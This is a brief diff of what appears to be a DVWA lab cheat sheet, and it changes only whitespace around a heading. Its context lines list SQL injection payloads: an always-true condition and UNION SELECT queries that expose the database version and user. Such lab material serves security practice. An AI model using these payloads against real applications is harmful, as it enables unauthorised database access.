@@ -33,8 +33,7 @@ DVWA Low:
            
            
           
-DVWA (Low):
-           
+DVWA (Low):           
 %' or '0'='0
 %' or 0=0 union select null, version() #    //Displaying version
 %' or 0=0 union select null, user() #
